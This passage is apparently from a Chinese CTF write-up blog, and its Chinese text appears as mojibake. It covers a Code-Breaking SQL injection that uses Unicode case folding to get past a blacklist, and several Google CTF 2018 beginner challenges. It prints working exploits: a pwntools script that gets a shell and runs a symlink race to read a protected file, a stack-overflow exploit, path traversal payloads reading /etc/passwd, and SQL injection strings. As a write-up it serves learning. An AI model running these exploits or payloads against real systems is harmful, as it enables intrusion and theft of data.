class="built_in">JSON</span>.parse(fs.readFileSync(<span class="string">'../config.json'</span>, &#123;<span class="attr">encoding</span>: <span class="string">'utf-8'</span>, <span class="attr">flag</span>: <span class="string">'r'</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> app = <span class="keyword">new</span> Koa()</span><br><span class="line">    <span class="keyword">const</span> router = <span class="keyword">new</span> Router()</span><br><span class="line">    <span class="keyword">const</span> db = <span class="keyword">await</span> sqlite.open(<span class="string">':memory:'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."users" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "username" TEXT NOT NULL,</span></span><br><span class="line"><span class="string">        "password" TEXT,</span></span><br><span class="line"><span class="string">        CONSTRAINT "unique_username" UNIQUE ("username")</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE "main"."flags" (</span></span><br><span class="line"><span class="string">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">        "flag" TEXT NOT NULL</span></span><br><span class="line"><span class="string">    )`</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> user <span class="keyword">of</span> config.users) &#123;</span><br><span class="line">        <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "users"("username", "password") VALUES ('<span class="subst">$&#123;user.username&#125;</span>', '<span class="subst">$&#123;user.password&#125;</span>')`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> db.run(<span class="string">`INSERT INTO "flags"("flag") VALUES ('<span class="subst">$&#123;config.flag&#125;</span>')`</span>)</span><br><span class="line"></span><br><span class="line">    router.all(<span class="string">'login'</span>, <span class="string">'/login/'</span>, login).get(<span class="string">'admin'</span>, <span class="string">'/'</span>, admin).get(<span class="string">'static'</span>, <span class="string">'/static/:path(.+)'</span>, <span class="keyword">static</span>).get(<span class="string">'/source'</span>, source)</span><br><span class="line"></span><br><span class="line">    app.use(views(__dirname + <span class="string">'/views'</span>, &#123;</span><br><span class="line">        map: &#123;</span><br><span class="line">            html: <span class="string">'underscore'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        extension: <span class="string">'html'</span></span><br><span class="line">    &#125;)).use(bodyParser()).use(session(app))</span><br><span class="line">    </span><br><span class="line">    app.use(router.routes()).use(router.allowedMethods());</span><br><span class="line">    </span><br><span class="line">    app.keys = config.signed</span><br><span class="line">    app.context.db = db</span><br><span class="line">    app.context.router = router</span><br><span class="line">    app.listen(<span class="number">3000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">static</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, ctx.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">admin</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ctx.session.user) &#123;</span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        <span class="keyword">return</span> ctx.redirect(ctx.router.url(<span class="string">'login'</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> ctx.render(<span class="string">'admin'</span>, &#123;</span><br><span class="line">        <span class="string">'user'</span>: ctx.session.user</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, basename(__filename))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„å…³é”®ç‚¹å°±æ˜¯<code>safeKeyword</code>å‡½æ•°çš„è¿‡æ»¤é»‘åå•ï¼Œå¹²æ‰äº†unionå’Œselectï¼Œè¿™ä»¥ä¸ºç€æ³¨å…¥æ—¶å½»åº•æ²¡åŠæ³•ä½¿ç”¨äº†ã€‚åœ¨ä¸‹é¢çš„ç™»å½•æŸ¥è¯¢é€»è¾‘ä¸­æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ³¨å…¥ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²ç›´æ¥æ‹¼æ¥è¿›æŸ¥è¯¢ã€‚å…¶å®ä¸€å¼€å§‹æ€è·¯æ˜¯ä»<code>isString</code>å’Œ<code>match</code>ä¸­å¯»æ‰¾ç»•è¿‡æ–¹æ³•ï¼Œä½†æ˜¯æ²¡æœ‰ä»€ä¹ˆç›¸å…³trickã€‚åæ¥åœ¨å‚è€ƒfishå¸ˆå‚…çš„wpä¸­ï¼Œæåˆ°äº†toUpperCaseï¼Œå…¶å®æƒ³æƒ³è¿™é‡Œæœ‰ä¸ªå¤§å†™è½¬æ¢ç¡®å®å¾ˆè¯¡å¼‚ï¼Œæ‰€ä»¥çªç ´å£åº”è¯¥æ˜¯åœ¨è¿™é‡Œã€‚æœç„¶åœ¨phå¸ˆå‚…çš„ä¹‹å‰çš„æ–‡ç« ä¸­æœ‰fuzzå‡ºæ¥çš„ç‰¹æ®Šå­—ç¬¦ã€‚</p><p><code>https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</code></p><p>è¿™é‡Œé¢ <code>Ä±</code> èƒ½å˜æˆå¤§å†™çš„<code>I</code> ï¼Œ<code>Å¿</code> ä¼šå˜æˆå¤§å†™çš„<code>S</code> ï¼Œé‚£ä¹ˆè¿™æ ·å°±èƒ½åœ¨æ­£å¸¸çš„å­—ç¬¦ä¸­æ’å…¥ç‰¹æ®Šå­—ç¬¦ç»•è¿‡<code>safeKeyword</code>çš„æ£€æµ‹ã€‚å†åŠ ä¸Šæˆ‘ä»¬çŸ¥é“flagå­˜æ”¾åœ¨flagsè¡¨ä¸­ï¼Œuserè¡¨çš„ç»“æ„ä¹Ÿæ˜¯çŸ¥é“çš„ï¼Œæ‰€ä»¥ç›´æ¥ç”¨unionæ³¨å…¥æŸ¥flagçš„å€¼ã€‚</p><p><code>&#39; unÄ±on Å¿elect 1,flag,3 from flags where &#39;1&#39;=&#39;1</code></p><p>ä¸ºäº†è¦é—­åˆå•å¼•å·ï¼Œå¿…é¡»è¦å‡‘ä¸ªwhereè¯­å¥ã€‚æœ€ç»ˆåœ¨ç™»å½•ç•Œé¢æ‹¿åˆ°flagã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><code>https://lorexxar.cn/2018/12/07/codingbreak-wp/</code></p><p><code>https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</code></p><p><code>https://www.cnblogs.com/iamstudy/articles/code_breaking_writeup.html</code></p><p><code>http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</code></p><p><code>http://rui0.cn/archives/1015</code></p><p><code>https://blog.l0ca1.xyz/Code-Breaking</code></p><p><code>https://blog.csdn.net/fnmsd/article/details/84556522</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;phå¸ˆå‚…çš„ä»£ç å®¡è®¡CTFé¢˜ç›® &lt;code&gt;https://code-breaking.com&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;easy-function&quot;&gt;&lt;a href=&quot;#easy-function&quot; class=&quot;headerlink&quot; title=&quot;easy 
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="ä»£ç å®¡è®¡" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner Part2</title>
    <link href="https://hurricane618.me/2018/08/15/google-ctf-beginner-part2/"/>
    <id>https://hurricane618.me/2018/08/15/google-ctf-beginner-part2/</id>
    <published>2018-08-14T16:47:21.000Z</published>
    <updated>2018-08-14T16:47:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Holey-Beep-PWN"><a href="#Holey-Beep-PWN" class="headerlink" title="Holey Beep(PWN)"></a>Holey Beep(PWN)</h2><p>Holey Beepæ˜¯CVE-2018-0492ï¼Œè¯¦ç»†çš„æ¼æ´ç»†èŠ‚ <a href="https://sigint.sh/#/holeybeep" target="_blank" rel="noopener">https://sigint.sh/#/holeybeep</a> ã€‚ä¸€å¼€å§‹ä»¥ä¸ºè¦ç”¨è¿™ä¸ªçš„expï¼Œç»“æœä¸€çœ‹ç»™çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¼¼ä¹ä¸å¤ªå¯¹â€¦â€¦æˆ‘ä»¬éœ€è¦å¾—åˆ°<code>/secret_cake_recipe</code>çš„å†…å®¹ï¼Œç„¶è€Œæƒé™ä¸å¤Ÿï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥æ˜¯æ‹¿æ¥è¶Šæƒçš„ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/1.png"><p>æˆ‘ä»¬çœ‹åˆ°ç¬¬ä¸€ä¸ªifæ˜¯ä¸€ä¸ªé€šè¿‡ä¿¡å·è§¦å‘çš„æ¡ä»¶ï¼Œç¬¬äºŒä¸ªifçŸ¥é“äº†ç¨‹åºéœ€è¦å‚æ•°ï¼Œç„¶åä¼šopenä¸€ä¸ªå†™æ­»çš„è·¯å¾„ï¼Œä¹‹åå°†è¾“å…¥çš„å‚æ•°ä»£å…¥<code>ioctl(device,0x4B2F,å‚æ•°)</code>ï¼Œå‡ºç°é—®é¢˜å°±ä¼šæ‰“å°æŠ¥é”™ä¿¡æ¯ï¼Œç„¶åå…³é—­æ‰“å¼€çš„æ–‡ä»¶ã€‚å¾ªç¯ä¸Šé¢çš„æ“ä½œæŠŠæ‰€æœ‰çš„å‚æ•°éƒ½è·‘ä¸€éã€‚</p><p>ä¿¡å·è§¦å‘çš„ifä¼šæ‰§è¡Œé¢å¤–çš„ä¸€æ®µå‡½æ•°ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/2.png"><p>è¿™é‡ŒifæˆåŠŸçš„è¯å°±ä¼šæ‰“å°é”™è¯¯ä¿¡æ¯ï¼Œè¯»å–opençš„æ–‡ä»¶è¾“å‡ºå‡ºæ¥ã€‚è¿™é‡Œåº”è¯¥æ˜¯é‡ç‚¹ï¼Œæœ‰è¯»å†™æ“ä½œã€‚</p><p>å¦‚æœæˆ‘ä»¬è¯»çš„æ–‡ä»¶æ˜¯<code>/secret_cake_recipe</code>é‚£ä¹ˆåªè¦è§¦å‘signalä»¥åŠæ»¡è¶³ifåˆ¤æ–­å°±å¯ä»¥æ‹¿åˆ°æ•°æ®ã€‚è¿™é‡Œå¯ä»¥ç”¨<code>ln -s</code>è½¯é“¾æ¥ç”Ÿæˆ<code>dev/console</code>ï¼Œç„¶åæˆ‘ä»¬æ‰§è¡Œè¯¥ç¨‹åºåŒæ—¶å‘é€SIGTERMä¿¡å·å°±å¯ä»¥è¶Šæƒæ‹¿åˆ°æ•°æ®ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¦è®©ç¨‹åºå»¶é•¿è¿è¡Œæ—¶é—´æ‰è¡Œï¼Œå¦‚æœè¿è¡Œæ—¶é—´ä¸è¶³ï¼Œè¿˜æ²¡æ¥æ”¶åˆ°ä¿¡å·å°±ç»“æŸäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"fridge-todo-list.ctfcompetition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"whz\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"read?"</span>)</span><br><span class="line">r.send(<span class="string">"-6\n"</span>)</span><br><span class="line">res = r.readuntil(<span class="string">"Hi whz,"</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">':'</span>, <span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,chr(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">"&lt;Q"</span>, write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr - <span class="number">0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"3\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"entry?"</span>)</span><br><span class="line">r.send(<span class="string">"-4\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">8</span> + pack(<span class="string">"&lt;Q"</span>, system_addr) + <span class="string">"\n"</span>)</span><br><span class="line">r.send(<span class="string">"/bin/sh\n"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.send(<span class="string">"cd /tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '#!/bin/bash' &gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'mkdir dev' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'ln -s /secret_cake_recipe dev/console' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '/home/user/holey_beep &#123;1..4096&#125; &amp;' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'pkill holey_beep -SIGTERM' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"chmod +x pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"./pwn.sh\n"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦å¤šè¯•å‡ æ¬¡æ¥è§¦å‘æ¡ä»¶ç«äº‰ï¼Œæœ€åæ‹¿åˆ°flag</p><img src="/2018/08/15/google-ctf-beginner-part2/3.png"><h2 id="Admin-UI-PWN-RE"><a href="#Admin-UI-PWN-RE" class="headerlink" title="Admin UI(PWN+RE)"></a>Admin UI(PWN+RE)</h2><p>çœ‹äº†é¢˜ç›®çš„ä»‹ç»ï¼Œå†åŠ ä¸Šè¿™ä¸ªè¡¥ä¸ä¿¡æ¯ï¼ŒçŸ¥é“äº†æœ‰è·¯å¾„ç©¿è¶Šæ¼æ´ã€‚è€Œä¸€çœ‹æä¾›çš„åŠŸèƒ½ä¸­åªæœ‰ç¬¬äºŒä¸ªé€‰é¡¹æœ‰è¯»çš„æ“ä½œï¼Œç„¶åè¯•äº†ä¸€ä¸‹<code>../../../../../../../../../../../etc/passwd</code>ï¼Œæœç„¶è¯»åˆ°äº†passwdæ–‡ä»¶ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/4.png"><p>é‚£ä¹ˆå‰©ä¸‹æ¥çš„å°±åªæ˜¯å¯»æ‰¾è¦è¯»çš„æ–‡ä»¶äº†ã€‚</p><p>é€šè¿‡ä½¿ç”¨<code>../../../../../../proc/self/cmdline</code>å¾—åˆ°è¿è¡Œç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/5.png"><p>å¾—åˆ°è¿è¡Œç¨‹åºçš„å‘½åï¼Œéœ€è¦çŒœè·¯å¾„ï¼ŒçŒœåˆ°äº†<code>../main</code>ï¼ŒæŠŠè¯»å–åˆ°çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¿å­˜ä¸‹æ¥ <code>printf &quot;2\n../main\n3\n&quot; | nc mngmnt-iface.ctfcompetition.com 1337 &gt; output.bin</code></p><p>å†é€šè¿‡16è¿›åˆ¶ç¼–è¾‘å™¨æŠŠå¤šä½™çš„ç›®å½•åˆ æ‰ï¼Œè¿™æ ·å°±å¾—åˆ°äº†æœåŠ¡å™¨ä¸Šçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><p>æµè§ˆä»£ç ï¼Œåœ¨éªŒè¯ç™»å½•çš„è¿‡ç¨‹ä¸­æ‰“å¼€äº†<code>flag</code>æ–‡ä»¶ï¼Œç„¶åæ¯”è¾ƒè¾“å…¥ã€‚è¿™æ ·ç›®æ ‡å°±å¾ˆæ˜ç¡®äº†ï¼Œç›´æ¥è¯»<code>../flag</code>å°±å¯ä»¥æ‹¿åˆ°flagã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/6.png"><h2 id="Admin-UI-2-PWN-RE"><a href="#Admin-UI-2-PWN-RE" class="headerlink" title="Admin UI 2(PWN+RE)"></a>Admin UI 2(PWN+RE)</h2><p>ç»§ç»­ä¸Šä¸€é¢˜çš„ç¨‹åºåˆ†æç¬¬äºŒä¸ªå¯†ç </p><img src="/2018/08/15/google-ctf-beginner-part2/7.png"><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹æˆ‘ä»¬çš„è¾“å…¥å¼‚æˆ–ä¹‹åä¼šå¾—åˆ°flagæ•°ç»„ä¸­çš„èµ‹å€¼ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°flagæ•°ç»„çš„å€¼ï¼Œåªè¦å†æ¬¡å¼‚æˆ–å›å»å³å¯å¾—åˆ°å¯†ç ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/8.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e_string = [<span class="number">0x84</span>, <span class="number">0x93</span>, <span class="number">0x81</span>, <span class="number">0xbc</span>, <span class="number">0x93</span>, <span class="number">0xb0</span>, <span class="number">0xa8</span>, <span class="number">0x98</span>, <span class="number">0x97</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0x94</span>, <span class="number">0xb0</span>, <span class="number">0xa8</span>, <span class="number">0xb5</span>, <span class="number">0x83</span>, <span class="number">0xbd</span>, <span class="number">0x98</span>, <span class="number">0x85</span>, <span class="number">0xa2</span>, <span class="number">0xb3</span>, <span class="number">0xb3</span>, <span class="number">0xa2</span>, <span class="number">0xb5</span>, <span class="number">0x98</span>, <span class="number">0xb3</span>, <span class="number">0xaf</span>, <span class="number">0xf3</span>, <span class="number">0xa9</span>, <span class="number">0x98</span>, <span class="number">0xf6</span>, <span class="number">0x98</span>, <span class="number">0xac</span>, <span class="number">0xf8</span>, <span class="number">0xba</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> e_string:</span><br><span class="line">    s ^= <span class="number">0xc7</span></span><br><span class="line">    flag += chr(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/9.png"><h2 id="Admin-UI-3-PWN-RE"><a href="#Admin-UI-3-PWN-RE" class="headerlink" title="Admin UI 3(PWN+RE)"></a>Admin UI 3(PWN+RE)</h2><p>è¿™é‡Œæœ‰ä¸¤ä¸ªæ¼æ´ç‚¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç¬¬äºŒä¸ªæ˜¯æ ˆæº¢å‡ºæ¼æ´ï¼Œæˆ‘è¿™é‡Œæ˜¯ä½¿ç”¨çš„æ˜¯æ ˆæº¢å‡ºæ¼æ´ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/10.png"><p>çœ‹åˆ°ç¼“å†²åŒºçš„ä½ç½®ç¦»bpå¯„å­˜å™¨æœ‰0x30çš„è·ç¦»ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/11.png"><p>åˆå› ä¸ºæ˜¯64ä½ç¨‹åºï¼Œæ‰€ä»¥å†åŠ ä¸Š8ä¸ªå­—èŠ‚çš„RBPï¼Œæœ€ååŠ ä¸Šæˆ‘ä»¬çš„geishellå‡½æ•°åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'mngmnt-iface.ctfcompetition.com'</span>,<span class="number">1337</span>)</span><br><span class="line">shell_add = <span class="number">0x41414349</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"1\n\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"CTF&#123;I_luv_buggy_sOFtware&#125;\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">35</span>+<span class="string">"\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Authenticated"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">0x38</span> + p64(shell_add))</span><br><span class="line">r.send(<span class="string">"quit\n"</span>)</span><br><span class="line">r.send(<span class="string">"quit\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/12.png"><h2 id="Firmware-RE"><a href="#Firmware-RE" class="headerlink" title="Firmware(RE)"></a>Firmware(RE)</h2><p>è™½ç„¶æ ‡ç­¾å†™çš„æ˜¯REä½†æ˜¯â€¦â€¦ï¼Œåšå®Œçš„æ„Ÿè§‰å°±æ˜¯ä¸€ä¸ªMISCã€‚</p><p>é¦–å…ˆæ‹¿åˆ°ä¸€ä¸ªzipæ–‡ä»¶ï¼Œè§£å‹ä¹‹åæ˜¯ä¸€ä¸ªgzå‹ç¼©åŒ…ï¼Œå†æ¬¡è§£å‹å¾—åˆ°ext4çš„æ–‡ä»¶ï¼Œæœç´¢ä¹‹åå¾—çŸ¥æ˜¯ä¸€ä¸ªLinuxçš„æ–‡ä»¶ç³»ç»Ÿã€‚ç›´æ¥æŒ‚è½½ä¹‹ï¼Œ<code>mount -t ext4 challenge2.ext4 /mnt</code>ï¼Œéœ€è¦rootæƒé™ã€‚æŒ‚è½½ä¹‹åå¯»æ‰¾çº¿ç´¢ï¼Œæ‰¾äº†ä¸€åœˆåœ¨æ ¹ç›®å½•ä¸‹æœ‰ä¸ªéšè—å‹ç¼©æ–‡ä»¶<code>.mediapc_backdoor_password.gz</code>ï¼Œè§£å‹catä¸€ä¸‹ï¼Œå¾—åˆ°flagã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/13.png"><h2 id="Gatekeepker-RE"><a href="#Gatekeepker-RE" class="headerlink" title="Gatekeepker(RE)"></a>Gatekeepker(RE)</h2><p>ä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸²é€†åºç¨‹åºï¼Œæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¼šè¢«é€†åºï¼Œç„¶åå’Œ<code>zLl1ks_d4m_T0g_I</code>æ¯”è¾ƒï¼Œè¿™æ ·å°±ç®€å•äº†ï¼Œç›´æ¥é€†è½¬å›æ¥å°±å¥½ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/14.png"><img src="/2018/08/15/google-ctf-beginner-part2/15.png"><h2 id="Media-DB-MISC"><a href="#Media-DB-MISC" class="headerlink" title="Media-DB(MISC)"></a>Media-DB(MISC)</h2><p>ç»™äº†ä¸€ä¸ªpythonæ–‡ä»¶ï¼Œå¤§æ¦‚çš„åŠŸèƒ½æ˜¯èƒ½è®°å½•æ­Œæ‰‹å’Œæ­Œæ›²çš„ä¸€ä¸ªç®€æ˜“æ§åˆ¶å°ï¼Œè¦æˆ‘ä»¬è·å–oauth_tokenã€‚åœ¨è¾“å…¥ç‚¹ä¸­è¿‡æ»¤äº†å•å¼•å·ï¼Œè€Œä¸”è¾“å…¥ç‚¹åªæœ‰ä¸€ä¸ªæ²¡æœ‰åŠæ³•ä½¿ç”¨\æ¥è½¬ä¹‰å•å¼•å·é€ƒé€¸å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™é‡Œåªèƒ½å¯»æ‰¾å…¶ä»–æ€è·¯æ¥çªç ´ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/16.png"><p>è§‚å¯Ÿåˆ°è¿™é‡Œæœ‰ä¸€ä¸ªä»æ•°æ®åº“éšæœºè¯»æ­Œæ‰‹çš„æ“ä½œï¼Œå†åŠ ä¸Šä¹‹å‰çš„æ“ä½œå•å¼•å·ï¼ŒåŒå¼•å·è¿‡æ»¤ä¸ä¸€è‡´ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/17.png"><p>é‚£ä¹ˆè¿™é‡Œçš„ä¸ä¸€è‡´æ€§å°±ä¼šé€ æˆäºŒé˜¶æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿‡æ»¤åŒå¼•å·çš„è¾“å…¥ç‚¹ä¸­æ³¨å…¥å¸¦æœ‰å•å¼•å·çš„æ•°æ®ï¼Œç„¶ååœ¨éšæœºè¯»æ­Œæ‰‹çš„æ—¶å€™å•å¼•å·ä¼šè¢«ä»£å…¥SQLè¯­å¥ä¸­é€ 